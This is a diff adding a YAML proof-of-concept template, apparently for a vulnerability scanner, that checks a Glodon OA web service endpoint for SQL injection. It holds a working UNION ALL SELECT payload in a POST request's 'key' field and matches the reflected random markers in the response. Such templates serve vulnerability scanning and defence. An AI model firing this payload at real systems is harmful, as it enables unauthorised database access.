@@ -1,0 +1,22 @@
+name: poc-yaml-glodon-getimdictionary-sqli
+manual: true
+transport: http
+set:
+    s1: randomLowercase(20)
+    s2: randomLowercase(20)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary
+            follow_redirects: true
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: dasdas=&key=1' UNION ALL SELECT concat('{{s1}}','{{s2}}') --
+        expression: response.status == 200 && response.body_string.startsWith("<?xml") && response.body_string.contains(s1+s2) && response.body_string.contains("result  value=")
+expression: r0()
+detail:
+    author: EASY
+    links:
+        - https://github.com/Ershu1/2023_Hvv/blob/d851d9282979c313b7dcfcd05da2c09348c67669/%E5%B9%BF%E8%81%94%E8%BE%BEoa%20%E6%BC%8F%E6%B4%9E.md
